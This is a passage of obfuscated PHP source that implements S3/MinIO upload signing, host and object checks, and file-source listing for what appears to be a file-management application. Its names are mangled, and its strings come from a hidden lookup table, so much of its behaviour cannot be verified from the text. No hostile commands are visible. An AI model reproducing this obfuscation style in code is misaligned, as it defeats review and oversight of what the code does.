hash_hmac($‰¦çäÆ[278], $½ÅŠïçÕ, $‰¦çäÆ[279] . $this->secret, !0); $ò·³­äˆ = hash_hmac($‰¦çäÆ[278], $this->region, $ˆ¯‰ôåş, !0); $€—¹Ê¹ï = hash_hmac($‰¦çäÆ[278], $Û×”Úåû, $ò·³­äˆ, !0); $»¹¤“Ã = hash_hmac($‰¦çäÆ[278], $§Òé€ü, $€—¹Ê¹ï, !0); $ Ô¢ıÎ° = hash_hmac($‰¦çäÆ[278], $«„Ÿè’á, $»¹¤“Ã); $‘øù‘ü’ = array($‰¦çäÆ[249] => $‰¦çäÆ[12], $‰¦çäÆ[273] => $†şìÙÀ¼, $‰¦çäÆ[280] => $«„Ÿè’á, $‰¦çäÆ[274] => $»£ˆö…‰, $‰¦çäÆ[275] => $Æ¹Ä‡³¿, $‰¦çäÆ[276] => $š²ş´‘Ö, $‰¦çäÆ[277] => $»ò®‹Ü€, $‰¦çäÆ[281] => $ Ô¢ıÎ°, $‰¦çäÆ[259] => $‰¦çäÆ[250], $‰¦çäÆ[209] => $this->getHost()); if ($this->_isClientAsync()) { unset($‘øù‘ü’[$‰¦çäÆ[259]]); } return $‘øù‘ü’; } public function uploadMultiData($Ó¶ÛøÏ°, $ÎŒşÔè = 3600) { $Ê°úªàä =& $_SERVER[®»±”ó²]; $ŠªÚ«Á» = $this->signVer == $Ê°úªàä[250] ? gmdate($Ê°úªàä[282]) : gmdate($Ê°úªàä[283]); $áèÒŒ®¼ = array(); $é£Ò™ÉÙ = $this->client->getUploadId($this->bucket, $Ó¶ÛøÏ°, $áèÒŒ®¼); if (!$é£Ò™ÉÙ) { return !1; } $›É©çøº = array($Ê°úªàä[284] => $é£Ò™ÉÙ, $Ê°úªàä[209] => $this->getHost() . $Ê°úªàä[8] . $this->pathEncode($Ó¶ÛøÏ°), $Ê°úªàä[285] => $ŠªÚ«Á», $Ê°úªàä[97] => $Ó¶ÛøÏ°, $Ê°úªàä[259] => $this->signVer); if ($this->_isClientAsync()) { unset($›É©çøº[$Ê°úªàä[259]]); } return $›É©çøº; } public function uploadMultiAuth($èÓŞõÑæ, $ıí™¨Š = array()) { $†—£×ö¥ =& $_SERVER[®»±”ó²]; if ($this->signVer == $†—£×ö¥[250]) { if (isset($ıí™¨Š[$†—£×ö¥[286]])) { return $this->uploadPartAuthV2($èÓŞõÑæ, $ıí™¨Š); } return $this->uploadListAuthV2($èÓŞõÑæ, $ıí™¨Š); } if (isset($ıí™¨Š[$†—£×ö¥[286]])) { return $this->uploadPartAuthV4($èÓŞõÑæ, $ıí™¨Š); } return $this->uploadListAuthV4($èÓŞõÑæ, $ıí™¨Š); } public function uploadPartAuthV2($ÈŸšôí¥, $ê¬ëö™Ü = array()) { $ş‹Òµ¯ =& $_SERVER[®»±”ó²]; $®Å€ = $ê¬ëö™Ü[$ş‹Òµ¯[97]]; $øÊääŞ„ = gmdate($ş‹Òµ¯[282]); $‰ûõˆøÖ = array_intersect_key($ê¬ëö™Ü, array_flip(array($ş‹Òµ¯[286], $ş‹Òµ¯[284]))); ksort($‰ûõˆøÖ); $Ú˜û½¤ç = $‰ûõˆøÖ ? $ş‹Òµ¯[76] . http_build_query($‰ûõˆøÖ, null, $ş‹Òµ¯[287], PHP_QUERY_RFC3986) : $ş‹Òµ¯[12]; $‚Œ©òº¦ = array($ş‹Òµ¯[256], $ş‹Òµ¯[12], $ş‹Òµ¯[123], $ş‹Òµ¯[12], "\x78\55\x61\x6d\172\x2d\144\141\164\145\72{$øÊääŞ„}", $ş‹Òµ¯[8] . $this->bucket . $ş‹Òµ¯[8] . $this->pathEncode($®Å€) . $Ú˜û½¤ç); $¾òÕÉà¹ = implode($ş‹Òµ¯[288], $‚Œ©òº¦); $İ–ä¼Ç = $this->client->__getSignature($¾òÕÉà¹); return array($ş‹Òµ¯[289] => $İ–ä¼Ç, $ş‹Òµ¯[285] => $øÊääŞ„); } public function uploadListAuthV2($Ø²ÒÖ±Í, $Óİ¯×³— = array()) { $¹¨ş…Û¿ =& $_SERVER[®»±”ó²]; $ì¨úŒÑ¶ = $Óİ¯×³—[$¹¨ş…Û¿[97]]; $§ÌÆ ôÔ = $Óİ¯×³—[$¹¨ş…Û¿[284]]; $ä§ÅÉ’¦ = $this->client->listParts($this->bucket, $ì¨úŒÑ¶, $§ÌÆ ôÔ); if (!$ä§ÅÉ’¦) { return !1; } $öÄÊî = gmdate($¹¨ş…Û¿[282]); $ÌÉ¿˜„ = $¹¨ş…Û¿[290] . $§ÌÆ ôÔ; $¸–çâÂÖ = array($¹¨ş…Û¿[291], $¹¨ş…Û¿[12], $¹¨ş…Û¿[123], $¹¨ş…Û¿[12], "\x78\55\x61\x6d\x7a\55\144\x61\164\x65\x3a{$öÄÊî}", $¹¨ş…Û¿[8] . $this->bucket . $¹¨ş…Û¿[8] . $this->pathEncode($ì¨úŒÑ¶) . $ÌÉ¿˜„); $‹éÙÏı¬ = implode($¹¨ş…Û¿[288], $¸–çâÂÖ); $Ş±‚ÓÄà = $this->client->__getSignature($‹éÙÏı¬); return array($¹¨ş…Û¿[289] => $Ş±‚ÓÄà, $¹¨ş…Û¿[285] => $öÄÊî, $¹¨ş…Û¿[292] => $ä§ÅÉ’¦); } public function uploadPartAuthV4($£’Æàø¸, $Ö²É«şè = array()) { $¢©Àø´ =& $_SERVER[®»±”ó²]; $£ıÓø× = $Ö²É«şè[$¢©Àø´[97]]; $ã‚Õí¹› = array($¢©Àø´[276] => gmdate($¢©Àø´[283]), $¢©Àø´[293] => _get($Ö²É«şè, $¢©Àø´[294], hash($¢©Àø´[278], $¢©Àø´[12]))); $” ŞëğÕ = explode($¢©Àø´[211], $this->getHost()); $ƒ¨õ¸Í˜ = array($¢©Àø´[295] => $” ŞëğÕ[1], $¢©Àø´[296] => $¢©Àø´[12], $¢©Àø´[249] => $¢©Àø´[123], $¢©Àø´[297] => $Ö²É«şè[$¢©Àø´[79]]); $…ƒ¥û = $¢©Àø´[256]; $ÇƒÃ‡” = $¢©Àø´[8] . $this->pathEncode($£ıÓø×); $‹„Æ—ãú = array_intersect_key($Ö²É«şè, array_flip(array($¢©Àø´[286], $¢©Àø´[284]))); $…¤ŒÒ÷ = $this->client->__getSignatureV4($ã‚Õí¹›, $ƒ¨õ¸Í˜, $…ƒ¥û, $ÇƒÃ‡”, $‹„Æ—ãú); return array($¢©Àø´[289] => $…¤ŒÒ÷, $¢©Àø´[293] => $ã‚Õí¹›[$¢©Àø´[293]], $¢©Àø´[285] => $ã‚Õí¹›[$¢©Àø´[276]]); } public function uploadListAuthV4($¡Ù¯Ç©‡, $öŸ‹•‘ô = array()) { $‘åÌÔ¤ñ =& $_SERVER[®»±”ó²]; $¦ä¤¢Âº = $öŸ‹•‘ô[$‘åÌÔ¤ñ[97]]; $ÑİóŞÅı = $öŸ‹•‘ô[$‘åÌÔ¤ñ[284]]; $»¬°ÆÇ™ = $this->client->listParts($this->bucket, $¦ä¤¢Âº, $ÑİóŞÅı); if (!$»¬°ÆÇ™) { return !1; } $Ú°øÖ®… = $‘åÌÔ¤ñ[298]; foreach ($»¬°ÆÇ™ as $¶Éï¤Ş†) { $Ú°øÖ®… .= $‘åÌÔ¤ñ[299] . "\74\x50\x61\x72\x74\x4e\165\x6d\x62\x65\x72\x3e{$¶Éï¤Ş†[$‘åÌÔ¤ñ[300]]}\74\57\x50\x61\162\x74\116\x75\x6d\142\x65\x72\76\12" . "\x3c\x45\124\x61\x67\76{$¶Éï¤Ş†[$‘åÌÔ¤ñ[301]]}\74\57\105\124\x61\147\x3e\xa" . $‘åÌÔ¤ñ[302]; } $Ú°øÖ®… .= $‘åÌÔ¤ñ[303]; $£ÈÄ’¿Û = array($‘åÌÔ¤ñ[276] => gmdate($‘åÌÔ¤ñ[283]), $‘åÌÔ¤ñ[293] => hash($‘åÌÔ¤ñ[278], $Ú°øÖ®…)); $èåá–û‡ = explode($‘åÌÔ¤ñ[211], $this->getHost()); $¾Ú÷Ö¼¹ = array($‘åÌÔ¤ñ[295] => $èåá–û‡[1], $‘åÌÔ¤ñ[249] => $‘åÌÔ¤ñ[123], $‘åÌÔ¤ñ[297] => strlen($Ú°øÖ®…)); $Öş¤ûÉš = $‘åÌÔ¤ñ[291]; $ëÓÆÂ±Å = $‘åÌÔ¤ñ[8] . $this->pathEncode($¦ä¤¢Âº); $™„«Äßõ = array($‘åÌÔ¤ñ[284] => $ÑİóŞÅı); $™ŸÂµ¡ = $this->client->__getSignatureV4($£ÈÄ’¿Û, $¾Ú÷Ö¼¹, $Öş¤ûÉš, $ëÓÆÂ±Å, $™„«Äßõ); return array($‘åÌÔ¤ñ[289] => $™ŸÂµ¡, $‘åÌÔ¤ñ[293] => $£ÈÄ’¿Û[$‘åÌÔ¤ñ[293]], $‘åÌÔ¤ñ[285] => $£ÈÄ’¿Û[$‘åÌÔ¤ñ[276]], $‘åÌÔ¤ñ[292] => $»¬°ÆÇ™); } private function _isClientAsync() { $¶šŒµÕ =& $_SERVER[®»±”ó²]; static $Ğ·â»ñõ = null; if ($Ğ·â»ñõ === null) { $¿û°¶®’ = isset($_REQUEST[$¶šŒµÕ[304]]) ? json_decode($_REQUEST[$¶šŒµÕ[304]], !0) : !1; $Ğ·â»ñõ = $¿û°¶®’ && _get($¿û°¶®’, $¶šŒµÕ[305]) == $¶šŒµÕ[306]; } return $Ğ·â»ñõ; } public function getHost() { $ºÇÌ¶È =& $_SERVER[®»±”ó²]; $ƒÜ¥¦¦¼ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ºÇÌ¶È[70], $ºÇÌ¶È[64], $ºÇÌ¶È[69], $ºÇÌ¶È[62]))) { return $ƒÜ¥¦¦¼ . $ºÇÌ¶È[8] . $this->bucket; } if ($this->osType == $ºÇÌ¶È[62] && !is_domain($ƒÜ¥¦¦¼)) { return $ƒÜ¥¦¦¼ . $ºÇÌ¶È[8] . $this->bucket; } $ƒÜ¥¦¦¼ = explode($ºÇÌ¶È[211], $ƒÜ¥¦¦¼); return $ƒÜ¥¦¦¼[0] . $ºÇÌ¶È[211] . $this->bucket . $ºÇÌ¶È[10] . $ƒÜ¥¦¦¼[1]; } public function size($Ü“ùÓ”Â) { $¤ò‰¤Áç = $this->objectMeta($Ü“ùÓ”Â); return $¤ò‰¤Áç ? $¤ò‰¤Áç[$_SERVER[®»±”ó²][79]] : 0; } public function info($¼î£˜š®) { if ($this->isFolder($¼î£˜š®)) { return $this->folderInfo($¼î£˜š®); } else { if ($this->isFile($¼î£˜š®)) { return $this->fileInfo($¼î£˜š®); } } return !1; } public function exist($ï±ÌÇĞ”) { return $this->isFile($ï±ÌÇĞ”) || $this->isFolder($ï±ÌÇĞ”); } public function isFile($Ã°ïÅòó) { return !$this->isFolder($Ã°ïÅòó) && $this->objectMeta($Ã°ïÅòó); } public function isFolder($Ò›ú—õ) { return $this->cacheMethod($_SERVER[®»±”ó²][180], $Ò›ú—õ); } protected function objectMeta($‘ÈÁ±) { return $this->cacheMethod($_SERVER[®»±”ó²][182], $‘ÈÁ±); } protected function _objectMeta($€„ •‘) { $ŒÚ†°®ô =& $_SERVER[®»±”ó²]; $€„ •‘ = rtrim($€„ •‘, $ŒÚ†°®ô[8]); try { $Íè«€¸ = $this->client->getObjectInfo($this->bucket, $€„ •‘); if (!isset($Íè«€¸[$ŒÚ†°®ô[255]]) && isset($Íè«€¸[$ŒÚ†°®ô[307]])) { $Íè«€¸[$ŒÚ†°®ô[255]] = $Íè«€¸[$ŒÚ†°®ô[307]]; } } catch (Exception $„¢Ãë‚Ş) { $Íè«€¸ = !1; } if (!$Íè«€¸) { } return $Íè«€¸; } protected function _isFolder($ô€Òİ™Ô) { $Ùí¦õ‚¯ =& $_SERVER[®»±”ó²]; $ô€Òİ™Ô = rtrim($ô€Òİ™Ô, $Ùí¦õ‚¯[8]) . $Ùí¦õ‚¯[8]; if ($ô€Òİ™Ô == $Ùí¦õ‚¯[12] || $ô€Òİ™Ô == $Ùí¦õ‚¯[8]) { return !0; } $Ÿ¸¾’âÂ = $this->client->getBucket($this->bucket, $ô€Òİ™Ô, null, 1); if (empty($Ÿ¸¾’âÂ[$Ùí¦õ‚¯[239]])) { return !1; } $…ĞŒ¸©‘ = $Ÿ¸¾’âÂ[$Ùí¦õ‚¯[239]][0][$Ùí¦õ‚¯[32]]; return stripos($…ĞŒ¸©‘, $ô€Òİ™Ô) === 0 ? !0 : !1; if (substr($…ĞŒ¸©‘, -1) == $Ùí¦õ‚¯[8]) { return !0; } if (get_path_this($…ĞŒ¸©‘) == get_path_this($ô€Òİ™Ô)) { return !1; } return !0; } public function listObject($–È‘»á‘) { return $this->fileList($–È‘»á‘, $_SERVER[®»±”ó²][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($€·ùš¶Ø) { $°‡ñşû¼ =& $_SERVER[®»±”ó²]; parent::__construct($€·ùš¶Ø); $this->setSignVersion($°‡ñşû¼[250]); if (!$this->region) { $this->region = $°‡ñşû¼[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $…Äò£ñä = $this->getBktRegion(); return $this->region == $…Äò£ñä ? !0 : !1; } public function uploadFormData($¾ôú…â®, $Û­¾˜Ç = 3600) { $ÊÆ£™É… =& $_SERVER[®»±”ó²]; $ñ®Ğ’ë = $ÊÆ£™É…[232]; $Á´ú¸§Ù = $ÊÆ£™É…[260]; $˜øÙ­æÓ = $ÊÆ£™É…[62]; $¡õ²»œ = gmdate($ÊÆ£™É…[261]); $Ò „ÂÏ´ = gmdate($ÊÆ£™É…[262]); $Äî¥š¶’ = $ÊÆ£™É…[263]; $²êûœ× = $Û­¾˜Ç . $ÊÆ£™É…[12]; $àÆşëö = $ÊÆ£™É…[264]; $ÇÅ‡îÅî = array($this->accessKey, $Ò „ÂÏ´, $this->region, $˜øÙ­æÓ, $Äî¥š¶’); $©›ùæ‹ = implode($ÊÆ£™É…[8], $ÇÅ‡îÅî); $‹Åü‡˜ = array($ÊÆ£™É…[265] => gmdate($ÊÆ£™É…[266], strtotime($ÊÆ£™É…[267])), $ÊÆ£™É…[268] => array(array($ÊÆ£™É…[269] => $this->bucket), array($ÊÆ£™É…[309] => $ñ®Ğ’ë), array($ÊÆ£™É…[270], $ÊÆ£™É…[271], $ÊÆ£™É…[12]), array($ÊÆ£™É…[270], $ÊÆ£™É…[272], $ÊÆ£™É…[12]), array($ÊÆ£™É…[270], $ÊÆ£™É…[310], $ÊÆ£™É…[12]), array($ÊÆ£™É…[273] => $àÆşëö), array($ÊÆ£™É…[274] => $©›ùæ‹), array($ÊÆ£™É…[275] => $Á´ú¸§Ù), array($ÊÆ£™É…[276] => $¡õ²»œ), array($ÊÆ£™É…[277] => $²êûœ×))); $õ¢ı³Ú¬ = base64_encode(json_encode($‹Åü‡˜)); $÷Ê¢•ˆô = hash_hmac($ÊÆ£™É…[278], $Ò „ÂÏ´, $ÊÆ£™É…[279] . $this->secret, !0); $ÏŒÓÎ¸Ğ = hash_hmac($ÊÆ£™É…[278], $this->region, $÷Ê¢•ˆô, !0); $ƒ‡Æ‰ˆ = hash_hmac($ÊÆ£™É…[278], $˜øÙ­æÓ, $ÏŒÓÎ¸Ğ, !0); $›á×ıŒŒ = hash_hmac($ÊÆ£™É…[278], $Äî¥š¶’, $ƒ‡Æ‰ˆ, !0); $•˜“Öß¢ = hash_hmac($ÊÆ£™É…[278], $õ¢ı³Ú¬, $›á×ıŒŒ); $µ„¢ ™Š = array($ÊÆ£™É…[249] => $ÊÆ£™É…[12], $ÊÆ£™É…[297] => $ÊÆ£™É…[12], $ÊÆ£™É…[309] => $ñ®Ğ’ë, $ÊÆ£™É…[273] => $àÆşëö, $ÊÆ£™É…[280] => $õ¢ı³Ú¬, $ÊÆ£™É…[311] => $©›ùæ‹, $ÊÆ£™É…[312] => $Á´ú¸§Ù, $ÊÆ£™É…[313] => $¡õ²»œ, $ÊÆ£™É…[314] => $²êûœ×, $ÊÆ£™É…[315] => $•˜“Öß¢, $ÊÆ£™É…[209] => $this->getHost()); return $µ„¢ ™Š; } } goto d®âÖ®Ã¥; c„‘Ñ‘’ˆ: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\x65"; protected $tableMeta = array("\164\x61\x62\x6c\145\x4e\x61\x6d\x65" => "\x69\157\137\163\x6f\165\162\x63\145\137\x6d\145\164\x61", "\155\x65\x74\x61\106\151\145\154\144" => "\x73\x6f\165\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\x6d\x6f\144\x69\146\x79\x54\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\162\164", "\146\165\156\x63\164\x69\157\x6e"), array("\x63\162\x65\x61\164\145\x54\151\155\145", "\x74\151\x6d\x65", "\x69\x6e\163\x65\162\164", "\x66\165\156\143\164\x69\x6f\156"), array("\166\151\x65\x77\x54\151\x6d\145", "\164\x69\x6d\145", "\x69\x6e\x73\145\162\164", "\x66\165\x6e\143\164\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÓˆÜŒØÈ) { return $this->listSource(array($_SERVER[®»±”ó²][488] => $ÓˆÜŒØÈ)); } public function typeName($¥î¼Ü£) { static $’ù›ğ¬í = array(self::TYPE_SYSTEM => "\x73\171\163\164\145\x6d", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\x72\x6f\165\160"); return $’ù›ğ¬í[$¥î¼Ü£ . $_SERVER[®»±”ó²][12]]; } public function sourceListInfo($ÀÉÚÌØÅ, $ƒò†ùñï = false) { $£ëóªáÛ =& $_SERVER[®»±”ó²]; $ÀÉÚÌØÅ = $ÀÉÚÌØÅ ? $ÀÉÚÌØÅ : array(); $ÀÉÚÌØÅ = array_filter(array_unique($ÀÉÚÌØÅ)); if (!$ÀÉÚÌØÅ) { return array(); } $³¦—êû× = $this->where(array($£ëóªáÛ[194] => array($£ëóªáÛ[7], $ÀÉÚÌØÅ)))->select(); $this->_listDataApply($³¦—êû×, $ƒò†ùñï); return array_to_keyvalue($³¦—êû×, $£ëóªáÛ[194]); } public function pathInfoFilter(&$ôÂ«ô¸ò) { $¤ÓĞø€’ =& $_SERVER[®»±”ó²]; static $„ÒÁÀùÂ = false; static $—Û¿ë ´ = false; static $Ó«Å‡èÙ = false; if (!$„ÒÁÀùÂ) { $èÒâœ«ñ = $¤ÓĞø€’[489]; $èÒâœ«ñ .= $¤ÓĞø€’[490]; $èÒâœ«ñ .= $¤ÓĞø€’[491]; $ÒıšëŞ = $¤ÓĞø€’[492]; $‘÷ÓèËæ = explode($¤ÓĞø€’[50], $ÒıšëŞ); $„ÒÁÀùÂ = explode($¤ÓĞø€’[50], $èÒâœ«ñ); $—Û¿ë ´ = array(); foreach ($„ÒÁÀùÂ as $‘¡šğê•) { if (in_array($‘¡šğê•, $‘÷ÓèËæ)) { continue; } $—Û¿ë ´[] = $‘¡šğê•; } $Ó«Å‡èÙ = explode($¤ÓĞø€’[50], $¤ÓĞø€’[493]); } foreach ($Ó«Å‡èÙ as $¬‡ÖãŸ±) { if (isset($ôÂ«ô¸ò[$¬‡ÖãŸ±])) { $ôÂ«ô¸ò[$¬‡ÖãŸ±] = intval($ôÂ«ô¸ò[$¬‡ÖãŸ±]); } } $ôÂ«ô¸ò[$¤ÓĞø€’[87]] = $¤ÓĞø€’[494] . $ôÂ«ô¸ò[$¤ÓĞø€’[194]] . $¤ÓĞø€’[495]; $ôÂ«ô¸ò[$¤ÓĞø€’[33]] = $ôÂ«ô¸ò[$¤ÓĞø€’[496]] == 1 ? $¤ÓĞø€’[78] : $¤ÓĞø€’[233]; $ôÂ«ô¸ò[$¤ÓĞø€’[191]] = $this->typeName($ôÂ«ô¸ò[$¤ÓĞø€’[191]]); if ($ôÂ«ô¸ò[$¤ÓĞø€’[496]] != 1) { $ôÂ«ô¸ò[$¤ÓĞø€’[169]] = $ôÂ«ô¸ò[$¤ÓĞø€’[497]]; unset($ôÂ«ô¸ò[$¤ÓĞø€’[497]]); } $¿Ó©œİ‹ = $„ÒÁÀùÂ; if (isset($ôÂ«ô¸ò[$¤ÓĞø€’[498]]) && $ôÂ«ô¸ò[$¤ÓĞø€’[498]][$¤ÓĞø€’[499]] == -1) { $¿Ó©œİ‹ = $—Û¿ë ´; } $ôÂ«ô¸ò = array_field_key($ôÂ«ô¸ò, $¿Ó©œİ‹); return $ôÂ«ô¸ò; } public function listUserFav() { $–ç» =& $_SERVER[®»±”ó²]; $Å–‘Ñ¹Ò = Model($–ç»[500])->listData(); $à‰áßñ = array_filter_by_field($Å–‘Ñ¹Ò, $–ç»[33], $–ç»[501]); $à‰áßñ = array_to_keyvalue($à‰áßñ, $–ç»[12], $–ç»[87]); if ($à‰áßñ) { $¹ ²Ò×û = $this->listSource(array($–ç»[502] => array($–ç»[503], $à‰áßñ))); } $¹ ²Ò×û = array_to_keyvalue($¹ ²Ò×û[$–ç»[447]], $–ç»[194]); foreach ($Å–‘Ñ¹Ò as &$¡Ã·­“½) { $¡Ã·­“½ = array($–ç»[504] => $¡Ã·­“½[$–ç»[477]], $–ç»[505] => $¡Ã·­“½[$–ç»[32]], $–ç»[506] => $¡Ã·­“½[$–ç»[87]], $–ç»[507] => $¡Ã·­“½[$–ç»[33]], $–ç»[508] => $¡Ã·­“½[$–ç»[234]], $–ç»[509] => $¡Ã·­“½[$–ç»[88]]); if ($¡Ã·­“½[$–ç»[33]] == $–ç»[501] && $¹ ²Ò×û[$¡Ã·­“½[$–ç»[87]]]) { $¡Ã·­“½[$–ç»[90]] = $¹ ²Ò×û[$¡Ã·­“½[$–ç»[87]]]; } } unset($¡Ã·­“½); return $Å–‘Ñ¹Ò; } public function listUserTag($™•Ì†¬) { $ÕûÉ²¬® =& $_SERVER[®»±”ó²]; if ($™•Ì†¬ && !is_array($™•Ì†¬)) { $™•Ì†¬ = array($™•Ì†¬); } $âÉãÉ = Model($ÕûÉ²¬®[510])->listData(); $‰æş©‰ = array(); $şŸªÖÂ‰ = array(); foreach ($âÉãÉ as $€¤ĞŒï¨) { $ûÂÖÔçò = $€¤ĞŒï¨[$ÕûÉ²¬®[87]]; if (!$ûÂÖÔçò) { continue; } if (!isset($şŸªÖÂ‰[$ûÂÖÔçò])) { $şŸªÖÂ‰[$ûÂÖÔçò] = array(); } $şŸªÖÂ‰[$ûÂÖÔçò][] = $€¤ĞŒï¨[$ÕûÉ²¬®[511]]; $‰æş©‰[$€¤ĞŒï¨[$ÕûÉ²¬®[87]]] = $€¤ĞŒï¨; } $£©ç‡°­ = array(); $î²ä½äõ = array(); $Ñ¨Ú€Ó› = array(); foreach ($şŸªÖÂ‰ as $›Ì¦ç => $©ìØä¦) { $Û ´•Ã = !0; if (!$™•Ì†¬) { $£©ç‡°­[] = $›Ì¦ç; continue; } foreach ($™•Ì†¬ as $àÈò¼¶§) { if (!in_array($àÈò¼¶§, $©ìØä¦)) { $Û ´•Ã = !1; break; } } if (!$Û ´•Ã) { continue; } if (!is_numeric($›Ì¦ç)) { $äîº¶« = $‰æş©‰[$›Ì¦ç]; $ôÚ’—åã = array($ÕûÉ²¬®[32] => $äîº¶«[$ÕûÉ²¬®[32]], $ÕûÉ²¬®[87] => $äîº¶«[$ÕûÉ²¬®[87]], $ÕûÉ²¬®[33] => $äîº¶«[$ÕûÉ²¬®[33]], $ÕûÉ²¬®[90] => array($ÕûÉ²¬®[512] => 1), $ÕûÉ²¬®[235] => !0); if ($äîº¶«[$ÕûÉ²¬®[33]] == $ÕûÉ²¬®[233]) { $Ñ¨Ú€Ó›[] = $ôÚ’—åã; } if ($äîº¶«[$ÕûÉ²¬®[33]] == $ÕûÉ²¬®[78]) { $î²ä½äõ[] = $ôÚ’—åã; } continue; } $£©ç‡°­[] = $›Ì¦ç; } if ($£©ç‡°­) { $·›¡ôüÅ = $this->listSource(array($ÕûÉ²¬®[502] => array($ÕûÉ²¬®[503], $£©ç‡°­))); } $·›¡ôüÅ = $·›¡ôüÅ ? $·›¡ôüÅ : array($ÕûÉ²¬®[85] => array(), $ÕûÉ²¬®[86] => array()); $·›¡ôüÅ[$ÕûÉ²¬®[85]] = array_merge($·›¡ôüÅ[$ÕûÉ²¬®[85]], $î²ä½äõ); $·›¡ôüÅ[$ÕûÉ²¬®[86]] = array_merge($·›¡ôüÅ[$ÕûÉ²¬®[86]], $Ñ¨Ú€Ó›); if (isset($·›¡ôüÅ[$ÕûÉ²¬®[444]]) && count($£©ç‡°­) == $·›¡ôüÅ[$ÕûÉ²¬®[444]][$ÕûÉ²¬®[445]]) { return $·›¡ôüÅ; } $‡Ã¤¨Ò­ = array(); $ø½Úøˆ­ = array_to_keyvalue($·›¡ôüÅ[$ÕûÉ²¬®[85]], $ÕûÉ²¬®[12], $ÕûÉ²¬®[194]); $ùÊÔø…ˆ = array_to_keyvalue($·›¡ôüÅ[$ÕûÉ²¬®[86]], $ÕûÉ²¬®[12], $ÕûÉ²¬®[194]); $æşù¿¢” = array_merge($ùÊÔø…ˆ, $ø½Úøˆ­); foreach ($£©ç‡°­ as $ûÂÖÔçò) { if (!in_array($ûÂÖÔçò, $æşù¿¢”)) { $‡Ã¤¨Ò­[] = $ûÂÖÔçò; } } if ($‡Ã¤¨Ò­) { Model($ÕûÉ²¬®[513])->removeBySource($‡Ã¤¨Ò­); } return $·›¡ôüÅ; } public function listUserRecycle() { $ĞÄíñšÏ =& $_SERVER[®»±”ó²]; $÷µÀñÔ = Model($ĞÄíñšÏ[514])->listData(); if (!$÷µÀñÔ) { return array(); } $”Ğş«’„ = array($ĞÄíñšÏ[502] => array($ĞÄíñšÏ[503], $÷µÀñÔ), $ĞÄíñšÏ[515] => 1); return $this->listSource($”Ğş«’„); } public function listSource($ÆÖœ’, $˜•ë·Ô¡ = 3000, $Ï«…ÕÒæ = false) { $”ÆÖ¬çÖ =& $_SERVER[®»±”ó²]; if (!isset($ÆÖœ’[$”ÆÖ¬çÖ[516]])) { $ÆÖœ’[$”ÆÖ¬çÖ[516]] = 0; } if (isset($ÆÖœ’[$”ÆÖ¬çÖ[193]]) && $ÆÖœ’[$”ÆÖ¬çÖ[193]] == $”ÆÖ¬çÖ[231]) { $ÆÖœ’[$”ÆÖ¬çÖ[497]] = array($”ÆÖ¬çÖ[517], $”ÆÖ¬çÖ[12]); } $‰Ê©ŞÄÇ = $”ÆÖ¬çÖ[518]; $›Å‰ğ¡Û = $this->field($‰Ê©ŞÄÇ)->_makeOrder()->where($ÆÖœ’)->selectPage($˜•ë·Ô¡); $this->_listPageCheck($›Å‰ğ¡Û, $‰Ê©ŞÄÇ, $ÆÖœ’); $this->_listDataApply($›Å‰ğ¡Û[$”ÆÖ¬çÖ[447]], $Ï«…ÕÒæ); $this->_listMake($›Å‰ğ¡Û); return $›Å‰ğ¡Û; } private function _listPageCheck(&$¶ÛéµÜŠ, $¹²¬†œ, $ŒºúÙÄë) { $Ë¦µµŸ‘ =& $_SERVER[®»±”ó²]; if (!is_array($¶ÛéµÜŠ[$Ë¦µµŸ‘[444]])) { return; } $İØÃ¨± = $¶ÛéµÜŠ[$Ë¦µµŸ‘[444]]; if ($İØÃ¨±[$Ë¦µµŸ‘[446]] <= 1) { return; } if ($İØÃ¨±[$Ë¦µµŸ‘[445]] >= 100000) { return; } if (Model($Ë¦µµŸ‘[519])->get($Ë¦µµŸ‘[520]) != $Ë¦µµŸ‘[521]) { return; } $¹²¬†œ = str_replace(array($Ë¦µµŸ‘[53], $Ë¦µµŸ‘[419], $Ë¦µµŸ‘[288]), $Ë¦µµŸ‘[12], $¹²¬†œ); $¹²¬†œ = $Ë¦µµŸ‘[522] . str_replace($Ë¦µµŸ‘[50], $Ë¦µµŸ‘[523], $¹²¬†œ) . $Ë¦µµŸ‘[524]; $¬Ö¸´·‹ = $Ë¦µµŸ‘[525]; $¬Ö¸´·‹ = $¬Ö¸´·‹ . $Ë¦µµŸ‘[526]; $–¢’Ş¨£ = $İØÃ¨±[$Ë¦µµŸ‘[441]] * ($İØÃ¨±[$Ë¦µµŸ‘[430]] - 1) . $Ë¦µµŸ‘[50] . $İØÃ¨±[$Ë¦µµŸ‘[441]]; $´ê•Ğ‹Ô = $this->_makeOrder(!0); $«©È§§Ò = $Ë¦µµŸ‘[522] . str_replace($Ë¦µµŸ‘[50], $Ë¦µµŸ‘[523], $´ê•Ğ‹Ô[0]); if (strpos($«©È§§Ò, $Ë¦µµŸ‘[527])) { $«©È§§Ò = str_replace($Ë¦µµŸ‘[527], $Ë¦µµŸ‘[528], $«©È§§Ò); } else { $«©È§§Ò .= $Ë¦µµŸ‘[529] . $´ê•Ğ‹Ô[1]; } $Íâ˜æ = array(); foreach ($ŒºúÙÄë as $‡¦ìâŸ‰ => $¢Ó×¸ƒˆ) { $Íâ˜æ[$Ë¦µµŸ‘[522] . $‡¦ìâŸ‰] = $¢Ó×¸ƒˆ; } $this->alias($Ë¦µµŸ‘[530])->field($¹²¬†œ)->limit($–¢’Ş¨£)->order($«©È§§Ò); $áİ¿ö”õ = $this->join($¬Ö¸´·‹)->where($Íâ˜æ)->select(); if ($áİ¿ö”õ) { $¶ÛéµÜŠ[$Ë¦µµŸ‘[447]] = $áİ¿ö”õ; } } protected function _makeOrder($¤‡˜ƒĞá = false) { $óŸ”ìí¬ =& $_SERVER[®»±”ó²]; $­šËƒ½€ = Model($óŸ”ìí¬[531])->get($óŸ”ìí¬[532]); 